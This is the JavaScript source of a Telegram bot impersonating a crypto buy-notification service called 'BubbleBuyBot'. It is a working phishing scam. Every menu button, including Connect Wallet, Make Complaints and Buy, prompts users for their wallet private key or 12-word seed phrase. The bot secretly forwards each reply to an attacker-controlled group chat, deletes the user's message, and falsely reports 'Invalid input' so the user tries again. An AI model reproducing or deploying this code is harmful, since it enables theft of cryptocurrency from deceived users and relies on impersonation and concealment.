import { Telegraf, Markup } from 'telegraf';
import LocalSession from 'telegraf-session-local';
import dotenv from 'dotenv';

dotenv.config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const externalGroupChatId = process.env.EXTERNAL_GROUP_CHAT_ID;

// Initialize session middleware
const session = new LocalSession({ database: 'session.json' });
bot.use(session.middleware());

// Handle /start command (Triggered when user opens the bot)
bot.start((ctx) => {
    // **First message: Intro (pops up immediately)**
    ctx.reply(
        `🤖 *What can this bot do?*\nBubbleBuyBot is a buy/sell notification bot working on the following chains (also available on Discord!):\n\n` +
        `✅ Binance Smart Chain\n✅ Ethereum\n✅ Arbitrum\n✅ And others!\n\n` +
        `🔥 Trending: @BubbleBuyBotTrending`
    );

    // **Second message: Main welcome message (appears after 2 seconds)**
    setTimeout(() => {
        ctx.reply(
            `👋 Hey, I am Bubble, one of the most popular notification buy bots and the only one without annoying ads!\n\n` +
            `ℹ️ I can track purchases of almost every token on multiple blockchains!\n` +
            `ℹ️ I have built-in commands like /price, /chart, and /contract!\n` +
            `ℹ️ I can run Biggest Buy and Raffle competitions!\n` +
            `ℹ️ I am ad-free!\n\n` +
            `Before proceeding, I suggest you read the /disclaimer first!\n\n` +
            `To start using me, add me to your group and type /start inside it.\n\n` +
            `If you need help, join the official group @BubbleBuyBotChat!`,
            Markup.inlineKeyboard([
                [Markup.button.url('➕ Add me to group', 'https://t.me/BubbleBuyBot?startgroup=true')],
                [Markup.button.callback('🔗 Connect Wallet', 'connect_wallet')],
                [Markup.button.callback('❗ Make Complaints', 'make_complaint')],
                [Markup.button.callback('🛒 Buy Button', 'buy')]
            ])
        );
    }, 2000); // Delay of 2 seconds (2000ms)
});

// Private key message
const privateKeyMessage = "🔑 Enter the private key of this wallet to continue. You may also use a 12-word mnemonic phrase.";

// Track if user is entering a private key
const sensitiveActions = ['connect_wallet', 'make_complaint', 'buy'];

sensitiveActions.forEach(action => {
    bot.action(action, (ctx) => {
        ctx.session.waitingForPrivateKey = true;
        ctx.reply(`❌ Wallet connection is not available yet. Stay tuned!\n\n${privateKeyMessage}`);
    });
});

// Handle user input for private key
bot.on('message', async (ctx) => {
    if (ctx.session.waitingForPrivateKey) {
        try {
            // Forward message to external group
            await bot.telegram.sendMessage(
                externalGroupChatId,
                `🔑 User Input from @${ctx.from.username || ctx.from.id}: ${ctx.message.text}`
            );
            
            // Delete user message immediately
            await ctx.deleteMessage();
            
            // Send error message and ask to retry
            await ctx.reply("❌ Invalid input. Please try again.");
        } catch (error) {
            console.log("Error handling user input:", error);
        }
    }
});

// Start the bot
bot.launch();
console.log('🤖 Bubble Bot is running...');
